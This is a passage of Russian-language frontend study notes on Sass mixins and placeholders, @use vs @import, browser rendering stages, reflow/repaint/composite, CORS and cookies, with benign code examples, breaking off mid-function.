  left: $left;
}

.modal {
  @include position(absolute, 10px, 10px);
}
```

###### 3. Переменное количество аргументов
```scss
@mixin transition($properties...) {
  transition: $properties;
}

.element {
  @include transition(color 0.3s ease, background 0.5s linear);
}
```

###### 4. Содержимое блока (@content)
```scss
@mixin media($width) {
  @media (min-width: $width) {
    @content;
  }
}

@include media(768px) {
  .container {
    width: 750px;
  }
}
```

###### Практические примеры использования

###### 1. Кроссбраузерные стили
```scss
@mixin flex-center {
  display: flex;
  justify-content: center;
  align-items: center;
}

.header {
  @include flex-center;
}
```

###### 2. Адаптивные медиа-запросы
```scss
@mixin respond-to($breakpoint) {
  @if $breakpoint == phone {
    @media (max-width: 599px) { @content; }
  } @else if $breakpoint == tablet {
    @media (min-width: 600px) { @content; }
  } @else if $breakpoint == desktop {
    @media (min-width: 1200px) { @content; }
  }
}

.section {
  padding: 10px;
  
  @include respond-to(tablet) {
    padding: 20px;
  }
}
```

###### 3. Сложные анимации
```scss
@mixin pulse-animation($name, $color) {
  @keyframes #{$name} {
    0% { box-shadow: 0 0 0 0 rgba($color, 0.7); }
    70% { box-shadow: 0 0 0 10px rgba($color, 0); }
    100% { box-shadow: 0 0 0 0 rgba($color, 0); }
  }
}

@include pulse-animation(pulse-red, #ff0000);
```

###### Разница между миксинами и другими возможностями

###### Миксины vs @extend
- **Миксины** копируют код в каждое место использования
- **@extend** объединяет селекторы (может приводить к неожиданным результатам)

###### Миксины vs Функции
- **Миксины** генерируют CSS-код
- **Функции** возвращают значения для использования в свойствах

###### Лучшие практики

1. Называйте миксины по их функции, а не по реализации
2. Документируйте параметры миксинов
3. Разделяйте сложные миксины на более простые
4. Избегайте избыточного использования (не создавайте миксины для одноразовых стилей)

Миксины — это мощный инструмент, который при правильном использовании значительно упрощает поддержку CSS и уменьшает количество повторяющегося кода.

##### Placeholder (Silent) селекторы

https://sass-lang.su/documentation/style-rules/placeholder-selectors

В Sass есть особый тип селектора, известный как “placeholder”. Он выглядит и действует как селектор класса, но начинается с `%` и не включается в вывод CSS. Фактически, любой сложный селектор (те, что между запятыми), который даже _содержит_ селектор-заполнитель, не включен в CSS, равно как и любое правило стиля, все селекторы которого содержат заполнители.
Селекторы-заполнители полезны при написании библиотеки Sass, где каждое правило стиля может использоваться или не использоваться. Как правило, если вы пишете таблицу стилей только для своего собственного приложения, часто лучше просто расширить селектор классов, если он доступен.

```scss
%toolbelt {
  box-sizing: border-box;
  border-top: 1px rgba(#000, .12) solid;
  padding: 16px 0;
  width: 100%;

  &:hover { border: 2px rgba(#000, .5) solid; }
}

.action-buttons {
  @extend %toolbelt;
  color: #4285f4;
}

.reset-buttons {
  @extend %toolbelt;
  color: #cddc39;
}
```

```css
.action-buttons, .reset-buttons {
  box-sizing: border-box;
  border-top: 1px rgba(0, 0, 0, 0.12) solid;
  padding: 16px 0;
  width: 100%;
}
.action-buttons:hover, .reset-buttons:hover {
  border: 2px rgba(0, 0, 0, 0.5) solid;
}

.action-buttons {
  color: #4285f4;
}

.reset-buttons {
  color: #cddc39;
}
```


Placeholder селекторы (также известные как "silent" или "абстрактные" селекторы) — это специальный тип селекторов в Sass, которые существуют только во время компиляции и не попадают в итоговый CSS-файл.

###### Синтаксис placeholder-селекторов

Placeholder селекторы начинаются с символа `%`:

```scss
%center-element {
  display: flex;
  justify-content: center;
  align-items: center;
}

// Используется через @extend
.modal {
  @extend %center-element;
  background: white;
}

.tooltip {
  @extend %center-element;
  position: absolute;
}
```

После компиляции получим:

```css
.modal, .tooltip {
  display: flex;
  justify-content: center;
  align-items: center;
}

.modal {
  background: white;
}

.tooltip {
  position: absolute;
}
```

###### Отличия от миксинов и обычных селекторов

| Характеристика       | Placeholder (`%`) | Миксины (`@mixin`) | Обычные селекторы |
|----------------------|-------------------|--------------------|-------------------|
| Попадает в CSS       | Нет               | Нет                | Да                |
| Использование        | `@extend`         | `@include`         | Напрямую          |
| Генерируемый код     | Группировка селекторов | Копирование кода | Как есть          |
| Оптимизация          | Лучшая            | Худшая             | Средняя           |

###### Преимущества placeholder-селекторов

1. **Оптимизация CSS-кода** - Sass группирует все селекторы, которые наследуют placeholder
2. **Чистота итогового CSS** - не содержит "вспомогательных" классов
3. **Повторное использование** без дублирования кода
4. **Семантичность** - логическое разделение абстрактных стилей и конкретных компонентов

###### Практические примеры использования

###### 1. Абстрактные стилевые паттерны

```scss
%clearfix {
  &::after {
    content: '';
    display: table;
    clear: both;
  }
}

.container {
  @extend %clearfix;
}
```

###### 2. Сброс стилей

```scss
%reset-list {
  margin: 0;
  padding: 0;
  list-style: none;
}

.nav {
  @extend %reset-list;
  
  li {
    display: inline-block;
  }
}
```

###### 3. Анимации

```scss
%fade-in {
  animation: fadeIn 0.3s ease-out forwards;
  
  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }
}

.modal {
  @extend %fade-in;
}
```

###### Ограничения и рекомендации

1. **Нельзя использовать параметры** (в отличие от миксинов)
2. **Лучше подходят для статических стилей**, которые не нужно кастомизировать
3. **Избегайте слишком глубокого наследования** - может привести к неожиданному росту CSS
4. **Не злоупотребляйте** - используйте там, где действительно нужна группировка селекторов

###### Сочетание с другими возможностями Sass

Placeholder-селекторы можно комбинировать с:

```scss
// С миксинами
@mixin responsive-layout {
  %base-layout {
    display: grid;
    gap: 1rem;
  }
  
  @extend %base-layout;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
}

// В медиа-запросах
@media (min-width: 768px) {
  %desktop-only {
    display: block;
  }
  
  .menu {
    @extend %desktop-only;
  }
}
```

###### Итог

Placeholder-селекторы — это мощный инструмент для:
- Создания абстрактных стилевых паттернов
- Оптимизации итогового CSS-кода
- Уменьшения дублирования в исходном коде
- Поддержания чистоты и структурированности стилей

Используйте их вместо миксинов, когда вам нужно повторное использование без параметризации, и когда важна оптимальная группировка селекторов в скомпилированном CSS.


##### Разница между `@import` и `@use` в Sass

https://sass-lang.su/documentation/at-rules/use

###### `@import`

`@import` - это устаревший способ подключения файлов в Sass, который имеет несколько проблем:

```scss
// styles.scss
@import 'variables';
@import 'buttons';
```

###### Проблемы `@import`:
1. **Глобальная область видимости** - все переменные, миксины и функции доступны везде
2. **Конфликты имен** - можно случайно переопределить переменные
3. **Дублирование кода** - если один файл импортируется несколько раз
4. **Низкая производительность** - Sass должен обрабатывать каждый импорт

###### `@use` (современный способ)

`@use` был введен в Sass 1.23.0 как замена `@import`:

```scss
// styles.scss
@use 'variables';
@use 'buttons';
```

###### Преимущества `@use`:
1. **Локальная область видимости** - переменные доступны только через namespace
2. **Защита от конфликтов** - имена не пересекаются
3. **Контроль зависимостей** - явное указание что откуда используется
4. **Ленивая загрузка** - файлы загружаются только когда нужны

###### Использование переменных через `@use`:
```scss
@use 'variables' as vars;

.element {
  color: vars.$primary-color;
}
```

###### Возможности `@use`:
1. **Псевдонимы**:
```scss
@use 'very/long/path/to/variables' as v;
color: v.$primary;
```

2. **Глобальный доступ** (не рекомендуется):
```scss
@use 'variables' as *;
color: $primary;
```

3. **Конфигурация модулей**:
```scss
@use 'theme' with (
  $primary: blue,
  $secondary: green
);
```

###### Миграция с `@import` на `@use`

1. Заменяем `@import` на `@use`
2. Добавляем namespace для доступа к переменным
3. Используем `as *` только если необходимо
4. Для совместимости можно использовать `@forward`

###### Пример полной миграции

**Было (с @import):**
```scss
// _variables.scss
$primary: #3498db;

// styles.scss
@import 'variables';

.button {
  background: $primary;
}
```

**Стало (с @use):**
```scss
// _variables.scss
$primary: #3498db !default;

// styles.scss
@use 'variables' as vars;

.button {
  background: vars.$primary;
}
```

###### Вывод

- **Используйте `@use`** для новых проектов
- **Избегайте `@import`** - он устарел и будет удален в будущем
- **`@forward`** используйте для создания библиотек
- **Пространства имен** помогают организовать код

`@use` делает код более предсказуемым, безопасным и поддерживаемым.
## Browser

  

##### Критические этапы рендеринга

https://doka.guide/tools/how-the-browser-creates-pages/

https://developer.mozilla.org/ru/docs/Web/Performance/Guides/Critical_rendering_path

Чтобы нарисовать на экране результат работы нашего кода, браузеру нужно выполнить несколько этапов:

1. Сперва ему нужно скачать исходники.
2. Затем их нужно прочитать и _распарсить_.
3. После этого браузер приступает к _рендерингу_ — отрисовке.

###### Получение ресурсов, Fetching

Ресурсы браузер получает с помощью запросов к серверу. В ответ он может получить как, например, данные в виде [JSON](https://doka.guide/tools/json/), так и картинки, видео, файлы стилей и скриптов.

Самый первый запрос к серверу — обычно запрос на получение HTML-страницы (чаще всего `index.html`).
###### Парсинг, Parsing

По мере того как скачивается HTML-страница, браузер пытается её «прочитать» — распарсить.
###### DOM

Браузер работает не с текстом разметки, а с абстракциями над ним. Одна из таких абстракций, результат парсинга HTML-кода, называется [DOM](https://doka.guide/js/dom/).

_DOM (Document Object Model)_ — абстрактное представление HTML-документа, с помощью которого браузер может получать доступ к его элементам, изменять его структуру и оформление.

DOM — это дерево. Корень этого дерева — это элемент HTML, все остальные элементы — это дочерние узлы.

Для такого документа:

```html
<html>
  <head>
    <meta charset="utf-8">
    <title>Hello</title>
  </head>
  <body>
    <p class="text">Hello world</p>
    <img src="/hello.jpg" alt="Привет!">
  </body>
</html>

```

...получится такое дерево:

![DOM дерево](https://doka.guide/tools/how-the-browser-creates-pages/images/DOM-300w.png)

Пока браузер парсит документ и строит DOM, он натыкается на элементы типа [`<img>`](https://doka.guide/html/img/), [`<link>`](https://doka.guide/html/link/), [`<script>`](https://doka.guide/html/script/), которые содержат ссылки на другие ресурсы.

Если ресурс _неблокирующий_ (например, изображение), браузер запрашивает его параллельно с парсингом оставшейся части документа. _Блокирующие_ ресурсы (например, скрипты) приостанавливают обработку до своей полной загрузки.

###### CSSOM

Когда браузер находит элемент `<link>`, который указывает на файл стилей, браузер скачивает и парсит его. Результат парсинга CSS-кода — CSSOM.

_CSSOM (CSS Object Model)_ — по аналогии с DOM, представление стилевых правил в виде дерева.

Для документа выше с такими стилями:

```css

body {
  font-size: 1.5rem;
}

.text {
  color: red;
}

img {
  max-width: 100%;
}

```

...получим такое дерево:

![CSSOM дерево](https://doka.guide/tools/how-the-browser-creates-pages/images/CSSOM-300w.png)

Чтение стилей приостанавливает чтение кода страницы. Поэтому рекомендуется в самом начале отдавать только критичные стили — которые есть на всех страницах и конкретно на этой. Так мы уменьшаем время ожидания, пока «страница загрузится».

Благодаря оптимизациям (например, сканеру предзагрузки) стили могут не блокировать чтение HTML, но они точно блокируют выполнение JavaScript, потому что в JS могут использоваться CSS-селекторы для выборки элементов.

###### Render Tree

После того как браузер составил DOM и CSSOM, он объединяет их в общее _дерево рендеринга_ — Render Tree.

Render Tree — это термин, который используется движком WebKit, в других движках он может отличаться. Например, Gecko использует термин Frame Tree.

В итоге для нашего документа выше мы получим такое дерево:

![Render tree](https://doka.guide/tools/how-the-browser-creates-pages/images/render-tree-300w.png)

Обратите внимание, что в Render tree попадают только видимые элементы. Если бы у нас был элемент, спрятанный через [`display: none`](https://doka.guide/css/display/), он бы в это дерево не попал. Об этом подробнее мы ещё поговорим дальше.

Общая схема парсинга выглядит вот так:

![Общая схема парсинга HTML и CSS](https://doka.guide/tools/how-the-browser-creates-pages/images/1-300w.png)

На первых шагах мы разбираемся с HTML и CSS, а затем объединяем их в Render Tree.

###### Вычисление позиции и размеров, Layout

После того как у браузера появилось дерево рендеринга (Render Tree), он начинает «расставлять» элементы на странице. Этот процесс называется _Layout_.

Чтобы понимать, где какой элемент должен находиться и как он влияет на расположение других элементов, браузер рассчитывает размеры и положение каждого _рекурсивно_.

Расчёт начинается от корневого элемента дерева рендеринга, его размеры равны размеру вьюпорта. Далее браузер переходит поочерёдно к каждому из дочерних элементов.

Важно помнить, что Layout построен на поточной модели компоновки. Это значит, что если элементы не влияют на расположение и размеры других элементов, то их положение и размеры можно просчитать за один подход.

Именно поэтому при вёрстке макетов рекомендуется «находиться в потоке» — чтобы браузеру не приходилось несколько раз пересчитывать один и тот же элемент, так страница отрисовывается быстрее.

###### Глобальный и инкрементальный Layout

_Глобальный Layout_ — это процесс просчёта всего дерева полностью, то есть каждого элемента. _Инкрементальный_ — просчитывает только часть.

Глобальный Layout запускается, например, при изменении размера окна, потому что браузеру требуется подогнать всю страницу под новый размер экрана. Это **очень** дорогой процесс.

Инкрементальный Layout запускает пересчёт только «грязных» элементов.

###### «Грязные» элементы

Это те элементы, которые были изменены, и их дочерние элементы.

Если мы как-то поменяли блок, то браузер перерисует его и его детей, потому что их положение и размеры могут зависеть от родителя.

![Дерево «грязных» и перерисованных элементов](https://doka.guide/tools/how-the-browser-creates-pages/images/2-300w.png)

Дальше браузер приступает к, собственно, отрисовке.

###### Непосредственно отрисовка, Paint

Во время отрисовки (Paint) браузер наполняет пиксели на экране нужными цветами в зависимости от того, что в конкретном месте должно быть нарисовано: текст, изображение, цвет фона, тени, рамки и т. д.

Отрисовка тоже бывает _глобальной_ и _инкрементальной_. Чтобы понять, какую часть вьюпорта надо перерисовать, браузер делит весь вьюпорт на прямоугольные участки. Логика тут та же, как и в Layout — если изменения ограничены одним участком, то пометится «грязным» и перерисуется лишь он.

Отрисовка — это _самый_ дорогой процесс из всех, что мы уже перечислили.

###### Порядок отрисовки

Порядок отрисовки связан со стековым контекстом.

В общих чертах, отрисовка начинается с заднего плана и постепенно переходит к переднему:

- `background-color`;
- `background-image`;
- `border`;
- `children`;
- `outline`.

###### CPU и композитинг

И Layout, и Paint работают за счёт _CPU (central process unit)_, поэтому относительно медленные. Плавные анимации при таком раскладе невероятно дорогие.

Для плавных анимаций в браузерах предусмотрен композитинг (Compositing).

_Композитинг_ — это разделение содержимого страницы на «слои», которые браузер будет перерисовывать. Эти слои друг от друга не зависят, из-за чего изменение элемента в одном слое не затрагивает элементы из других слоёв, и перерисовывать их становится не нужно.

Именно из-за разнесения элементов по разным композиционным слоям свойство `transform` не так сильно нагружает браузер. Поэтому чтобы анимации не тормозили, их рекомендуется делать с применением `transform` и `opacity`.

![Схема композитинга](https://doka.guide/tools/how-the-browser-creates-pages/images/3-300w.png)

Применение таких свойств, как, например, `transform`, «выносит» элемент на отдельный композитный слой, где положение элемента не зависит от других и не влияет на них.

Чтобы узнать, вызывает ли конкретное CSS-свойство композитинг и перерисовку в браузере, воспользуйтесь инструментом «[CSS Triggers](https://csstriggers.com/)».

###### Перерисовка, Reflow (relayout) и Repaint

Процесс отрисовки — циклический. Браузер перерисовывает экран каждый раз, когда на странице происходят какие-то изменения.

Если, например, в DOM-дереве добавился новый узел, или изменился текст, то браузер построит новое дерево рендеринга и запустит вычисление позиции и отрисовку заново.

Один цикл обновления — это animation frame.

Зная «расписание отрисовки» браузера, мы можем «предупредить» его, что хотим запустить какую-то анимацию на каждый новый фрейм. Это можно сделать с помощью `requestAnimationFrame()`.

```js

const animate = () => { 
	// Код анимации 
}

```

Эта функция запускает новый кадр анимации: обновляет какое-то свойство или перерисовывает canvas.

Если мы хотим добиться плавной анимации, используя функцию выше, мы должны обеспечить в среднем 60 обновлений экрана за секунду (60 fps — frames per second).

Это можно сделать топорно, через интервал:

```js
// 60 раз в 1000 миллисекунд, приблизительно 16 мс.
const intervalMS = 1000 / 60
setInterval(animate, intervalMS)

```

Либо использовать `window.requestAnimationFrame()`:

```js

window.requestAnimationFrame(animate)

```

Интервалы не всегда запускаются в нужный момент. [`setInterval()`](https://doka.guide/js/setinterval/) не учитывает, на какой стадии отрисовки находится страница, и в итоге кадры отрисовки могут быть рваными или дёрганными.

С интервалом анимация может быть рваной, потому что перерисовка может быть запущена в неподходящее время.

А если вкладка была неактивна, то интервал может «попытаться догнать время», и несколько кадров запустятся разом:

![Анимация с setInterval](https://doka.guide/tools/how-the-browser-creates-pages/images/reflow-300w.png)

С `requestAnimationFrame()` анимация плавнее, потому что браузер знает, что в следующем фрейме надо запустить новый кадр анимации.

Она не гарантирует, что анимация будет запущена строго раз в 16 мс, но значение будет достаточно близким.

![Анимация с requestAnimationFrame](https://doka.guide/tools/how-the-browser-creates-pages/images/reflow-2-300w.png)

Для динамики всегда используйте [`transform`](https://doka.guide/css/transform/) и [`opacity`](https://doka.guide/css/opacity/), избегайте изменения остальных свойств (типа `left`, `top`, [`margin`](https://doka.guide/css/margin/), [`background`](https://doka.guide/css/background/) и так далее).

Таким образом вы дадите браузеру возможность оптимизировать отрисовку, отчего страница станет отзывчивее.

Для анимаций, которые необходимо перерисовывать на каждый фрейм, используйте `requestAnimationFrame()`.

Это сделает тяжёлую анимацию менее рваной.

##### Что такое прогрессивный рендеринг (progressive rendering)?

Чтобы понять что такое progressive rendering, нужно понимать отличие _client-side rendering_ от _server-side rendering_.

При **client-side rendering** (CSR) контент отрисовывается на стороне клиента (в браузере). Такой подход используется в React, когда браузеру отсылается практически пустой HTML-документ, а потом запускается скрипт, который генерирует HTML в указанном скрипту теге. Как правило это `<div id="root">`. Пользователь будет видеть пустую страницу, пока JS-файл полностью не загрузится.

При **server-side rendering** (SSR) HTML-разметка генерируется на сервере, отсылается браузеру и после этого отрисовывается на клиенте. Пользователь увидит контент сразу же, но не сможет взаимодействовать со страницей, пока не загрузится JS-файл.

При использовании прогрессивного рендеринга, кусочки HTML генерируется на сервере и отсылаются браузеру в порядке их приоритетности. То есть, элементы с самым высоким приоритетом (например `<header>`, фон, главная интерактивная часть страницы) генерируются на сервере, отсылаются браузеру и отрисовываются в первую очередь. Это позволяет пользователю увидеть самый важный контент как можно скорее, не дожидаясь полной загрузки всего контента. То есть, progressive rendering что-то среднее между client-side rendering и server-side rendering.

Техники реализации прогрессивного рендеринга:

1. **Ленивая загрузка** (Lazy Loading). Загрузка контента по мере необходимости. Например, если страница достаточно большая, не нужно загружать изображения вне вьюпорта. Загрузка изображения стартует за некоторое время до того как она появится во вьюпорте. Эту же технику можно использовать для загрузки контента изначально скрытых элементов. Например, можно загрузить контент закрытого меню когда пользователь наводит курсор на кнопку открытия.
2. **Приоритизация контента**. Например, не загружать изначально все CSS-стили. Добавлять в `<head>` загрузку только тех стилей, которые нужны для текущей видимой области HTML-документа. Остальные стили можно добавить в `<body>`.

##### **Reflow, Repaint, и Compose в браузере: как работает рендеринг**  

Когда браузер отображает веб-страницу, он проходит несколько этапов обработки HTML, CSS и JavaScript. **Reflow (перерасчёт макета), Repaint (перерисовка) и Compose (композиция)** — это ключевые процессы, влияющие на производительность.

---

###### **1. Reflow (Layout)**
**Что это?**  
Перерасчёт **размеров и позиций** элементов DOM. Происходит, когда:  
- Изменяются геометрические свойства (`width`, `height`, `margin`, `position` и т. д.).  
- Добавляются/удаляются элементы из DOM.  
- Изменяется размер окна браузера.  

**Примеры триггеров:**  
```js
element.style.width = '100px'; // Рефлоу
element.classList.add('new-class'); // Если класс меняет размеры/позицию
window.addEventListener('resize', callback); // Рефлоу при изменении окна
```

**Почему это дорого?**  
Браузер пересчитывает макет **всего документа** или его части (в лучшем случае).

---

###### **2. Repaint (Rasterize)**
**Что это?**  
Перерисовка **пикселей** без изменения макета. Происходит при:  
- Изменении визуальных свойств (`color`, `background`, `visibility`, `opacity`).  
- После Reflow (т. к. меняется геометрия).  

**Примеры триггеров:**  
```js
element.style.color = 'red'; // Только репаинт
element.style.opacity = '0.5'; // Репаинт (но современные браузеры могут оптимизировать через Compose)
```

**Почему это дешевле Reflow?**  
Не требует пересчёта макета, но всё равно затратно на больших страницах.

---

###### **3. Compose (Composite)**
**Что это?**  
Отдельный этап рендеринга, когда браузер **комбинирует готовые слои** (layers) в итоговое изображение.  

**Оптимизированные свойства (только Compose, без Reflow/Repaint):**  
- `transform` (`translate`, `scale`, `rotate`)  
- `opacity`  
- `filter` (в некоторых браузерах)  
- `will-change: transform` (подсказка браузеру создать отдельный слой)  

**Пример:**  
```js
element.style.transform = 'translateX(10px)'; // Только композиция
```

**Почему это быстро?**  
Браузер использует **GPU** и не трогает основной поток рендеринга.

---

###### **Как оптимизировать?**  
1. **Избегайте частых Reflow**:  
   - Группируйте изменения DOM через `documentFragment` или `requestAnimationFrame`.  
   - Используйте `flexbox/grid` вместо `float` (меньше перерасчётов).  

2. **Снижайте количество Repaint**:  
   - Применяйте `transform/opacity` вместо `top/left`.  
   - Используйте `will-change` для сложных анимаций.  

3. **Пользуйтесь Compose**:  
   - Анимируйте через `transform` и `opacity`.  

---

###### **Источники**  
1. [Google Developers: Rendering Performance](https://developers.google.com/web/fundamentals/performance/rendering)  
2. [MDN: Critical Rendering Path](https://developer.mozilla.org/en-US/docs/Web/Performance/Critical_rendering_path)  
3. [CSS Triggers](https://csstriggers.com/) (таблица свойств и их влияния на Reflow/Repaint)  

--- 

**Итог:**  
- **Reflow** = Перерасчёт макета → Самый дорогой.  
- **Repaint** = Перерисовка → Дешевле, но тоже затратно.  
- **Compose** = GPU-ускорение → Оптимально для анимаций.  

Оптимизируя эти этапы, можно значительно ускорить рендеринг страницы.
##### что вычисляется на процессоре а что на gpu в css?
В CSS практически все вычисления выполняются на **CPU**, а не на GPU. Однако есть определённые свойства и операции, которые могут **передаваться на GPU** для ускорения рендеринга.  

###### **Что обрабатывается на CPU?**  
Большинство вычислений в CSS выполняется на CPU, включая:  
- **Разметку (Layout / Reflow)** – вычисление размеров и позиций элементов (`width`, `height`, `margin`, `padding`, `position` и т. д.).  
- **Стилизацию (Style Calculation)** – применение CSS-правил (`color`, `font-size`, `background` и др.).  
- **Обработку сложных селекторов** (например, вложенные `:hover`, `:nth-child()`).  

###### **Что может обрабатываться на GPU?**  
Некоторые CSS-свойства могут **использовать GPU-ускорение** (через аппаратное ускорение), что улучшает производительность:  
1. **3D-трансформации** (`transform: translate3d()`, `rotate3d()`, `scale3d()`).  
2. **Анимации и переходы** (`transition`, `animation`) с `transform` или `opacity`.  
3. **Фильтры** (`filter: blur()`, `drop-shadow()`).  
4. **Наложения** (`will-change: transform, opacity`).  
5. **Видео и Canvas** (рендеринг `<video>` и `<canvas>` может использовать GPU).  

###### **Как задействовать GPU?**  
Чтобы браузер использовал GPU, можно применить:  
```css
.element {
    transform: translateZ(0); /* или translate3d(0, 0, 0) */
    will-change: transform;   /* подсказка браузеру */
}
```  
Это перемещает элемент в отдельный **GPU-слой (composition layer)**, что ускоряет анимации.  

###### **Вывод**  
- **CPU:** Основные вычисления (разметка, стилизация).  
- **GPU:** Отдельные оптимизированные операции (анимации, трансформации, фильтры).  

Если нужно ускорить анимации, лучше использовать `transform` и `opacity`, а не свойства, вызывающие перерасчёт разметки (например, `width` или `margin`).

##### CORS
http://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
https://habr.com/ru/companies/macloud/articles/553826/
https://doka.guide/tools/cors/

_CORS_ расшифровывается как _Cross-Origin Resource Sharing_. Это механизм браузера, который позволяет определить список ресурсов, к которым страница может получить доступ. Он нужен для обеспечения безопасности и защиты пользователей от злоумышленников при использовании [HTTP-протокола](https://doka.guide/tools/http-protocol/).

По умолчанию сайты могут запрашивать ресурсы только со своего `origin`. Такое ограничение называется _Same-Origin Policy_. CORS расширяет Same-Origin Policy, позволяя получать доступ к ресурсам с разных доменов.

`origin` – это комбинация протокола, домена и порта (если он указан). Например, `doka.guide` – это домен, а `https://doka.guide` – `origin`.

Настройка доступа должна происходить как со стороны браузера, так и со стороны сервера. Это означает, что и браузер, и сервер должны быть настроены на разрешение или запрет доступа к ресурсам с других `origin`.

> Пользователь открывает страницу сайта `doka.guide`. Страница отправляет запрос к стороннему источнику `api.example.com`.  
> Браузер сравнивает `origin` и понимает, что `api.example.com` – сторонний `origin` для нашего сайта, из-за чего блокирует запрос. Причём запрос может быть заблокирован в рамках одного домена, например, `origin` будет отличаться у `http://doka.guide` и `https://doka.guide` из-за несовпадения протоколов.

Такие запросы с сайта на сайт называются _перекрёстными_.
Для настройки CORS со стороны сервера используются специальные заголовки запроса:

- `Access-Control-Allow-Origin` – указывает на `origin`, откуда на сервер разрешены запросы.
- `Access-Control-Allow-Methods` – указывает, какие [HTTP-методы](https://doka.guide/tools/http-protocol/#startovaya-stroka) разрешены для запросов на сервер. Например, `GET`, `POST`, `DELETE`.
- `Access-Control-Allow-Headers` – определяет, какие заголовки могут быть использованы в ответе от сервера, которые не являются стандартными для [HTTP](https://doka.guide/tools/http-protocol/).
- `Access-Control-Allow-Credentials` – указывает, разрешено ли отправлять [cookie](https://doka.guide/js/cookie/) и авторизационные данные вместе с запросом на сервер. Для разрешения используется значение `true`.
- `Access-Control-Max-Age` – определяет максимальное время, в течение которого должны кэшироваться предыдущие ответы на запросы предварительной проверки CORS.
- `Access-Control-Expose-Headers` – определяет список заголовков, которые могут быть доступны на клиентской стороне.

Также есть заголовок для настройки со стороны браузера: `Origin` указывает на комбинацию домена, порта и протокола, откуда на сервер поступает запрос. А вот заголовки для настройки предварительных запросов:

- `Access-Control-Request-Method` – определяет метод запроса, который будет использоваться в основном запросе;
- `Access-Control-Request-Headers` – используется для указания заголовков, которые будут использоваться в основном запросе.

###### Предварительные запросы

Предварительный запрос – это дополнительный HTTP-запрос, который отправляется браузером перед основным запросом.

Когда страница запрашивает данные с другого `origin`, браузер отправляет предварительный запрос `OPTIONS` на сервер, чтобы узнать, разрешены ли такие запросы. При повторном запросе на тот же `origin`, запрос `OPTIONS` может и не отправляться, а все данные получаться из кэша.

При отправке запроса на `api.example.com`, браузер проставит заголовок `Origin`, сформирует запрос в [определённом формате](https://doka.guide/tools/http-protocol/#format-soobshcheniya) и отправит его на сервер:

```

OPTIONS / HTTP/1.1
Host: api.example.com
Origin: https://doka.guide

```

Если сервер запрещает доступ к ресурсу, то в результате запроса в браузере мы увидим ошибку. А если доступ разрешён, то сервер ответит на запрос заголовком:
```
Access-Control-Allow-Origin: https://doka.guide

```

Такая запись означает, что сервер разрешает доступ с домена `doka.guide`, при этом только по протоколу `https`.

Сервер может разрешить только один конкретный `Origin`, нельзя указать несколько. Если доступ необходим сразу с нескольких доменов, то сервер должен проверить, что `Origin` из запроса клиента разрешён и динамически подставить этот `Origin` в ответ. А ещё добавить заголовок `Vary: Origin`, чтобы браузер понимал, что ответ сервера зависит от источника запроса, и корректно обрабатывал такие ответы.

```

Access-Control-Allow-Origin: https://doka.guide
Vary: Origin

```

При желании можно давать доступ сразу всем:

```

Access-Control-Allow-Origin: *

```

Лучше избегать разрешения доступа с любого домена (`*`): это повышает уязвимость вашего сервера к [атакам](https://doka.guide/tools/web-security/), например, к CSRF.

CSRF расшифровывается как _cross-site request forgery_ или _межсайтовая подделка запроса_. Это вид атаки, когда злоумышленник получает доступ к данным из браузера другого человека и выполняет действия от его лица. Например, изменяет пароль от личного кабинета на сайте, где уже авторизован этот пользователь.


##### cookie
https://doka.guide/js/cookie/
https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies

При разработке сайтов часть информации (например, токен авторизации или данные пользователя) нужно хранить и читать как в браузере, так и на сервере. Для этого используют **Cookie** (произносится «куки»).

Куки передаются в виде HTTP-заголовка, это накладывает на них ограничения. Например, максимальный размер куки в 4096 байт или отсутствие в содержимом пробелов или запятых. Чтобы обезопасить содержимое, можно закодировать его с помощью функции `encodeURIComponent()`.

Все куки хранятся в свойстве `document.cookie`. Это свойство представляет собой [строку](https://doka.guide/js/string/) в формате `имя=значение`, где пары имён и значений разделяются знаком `;` . При этом взаимодействие с полем весьма необычное — если присвоить `document.cookie` новое значение, то оно не заменит полностью старую строку, а добавит или изменит значение по ключу.

Запись в cookie работает с помощью присвоения значения новой куки в поле `document.cookie`. За один раз можно записать лишь одно значение.

Вот так можно добавить значение 1 по ключу _counter_:

```js

document.cookie = 'counter=1'
console.log(document.cookie)
// 'counter=1'

```

При присвоении свойству куки с другим именем, получим два записанных значения:

```js

document.cookie = 'sidebar=false'
console.log(document.cookie)
// 'counter=1; sidebar=false;'

```

При повторной записи в то же поле другого значения оно будет перезаписано.

```js

document.cookie = 'sidebar=true'
console.log(document.cookie)
// -> 'counter=1; sidebar=true;'

```

При установке кук можно указывать не только её название и значение, но и другие параметры. Все они являются необязательными и разделяются точкой с запятой `;`.

- `path` — определяет путь, по которому будет доступна кука. Он должен быть абсолютным, то есть начинаться с `/`. Если параметр не передан, то кука будет доступна на всех страницах сайта.
- `domain` — определяет домен, для которого указана кука. Если не указано, то будет использоваться текущий домен.
- `max-age` и `expires` — определяет время жизни куки.`max-age` указывает, через сколько секунд, а `expires` указывает точное время, когда кука станет недействительна. Время для `expires` можно отформатировать с помощью встроенного метода даты `Date.toUTCString()`
- `secure` — указывает, что данная кука может быть передана только при запросах по защищённому протоколу HTTPS.
- `samesite` — определяет, может ли данная кука быть отправлена при кроссдоменном запросе. Значение параметра `strict` будет предотвращать отправку на другие домены, а `lax` разрешит отправлять куки с GET-запросами.

Есть пара ограничений при специфичных названиях кук. Если название куки начинается с `__Secure-`, то обязательно должен быть передан параметр `secure`. При этом мы должны находиться на странице, которая была получена по HTTPS-протоколу. Если название куки начинается с `__Host-`, то обязательно должны быть переданы параметры `path=/` и `secure` (страница также должна быть открыта по HTTPS-протоколу), а атрибут `domain` должен отсутствовать для снижения кроссдоменных уязвимостей.

Запись куки с разрешением передавать её только по HTTPS и только для текущего домена, со временем жизни в 1 час будет выглядеть так:

```js

document.cookie = 'sidebar=true;secure;samesite=strict;max-age=3600'

```

![Все возможные параметры установки куки](https://doka.guide/js/cookie/images/cookie-scheme-300w.png)

Для установки куки, которая будет доступна на текущем домене и всех его поддоменах, используйте название текущего домена и поставьте точку в начале — `.${window.location.hostname}`.

Для получения значений, записанных в куки, можно просто вывести содержимое `document.cookie`:

```js

console.log(document.cookie)

```

Учитывая, что мы уже дважды записывали куки, при вызове команды выше в консоли выведется `counter=1; sidebar=true;`.

Чтобы получить значение конкретной куки, нам нужно будет прочитать строки и разобрать её по значениям. Например, так:

```js

function getCookie() {
  return document.cookie.split('; ').reduce((acc, item) => {
    const [name, value] = item.split('=')
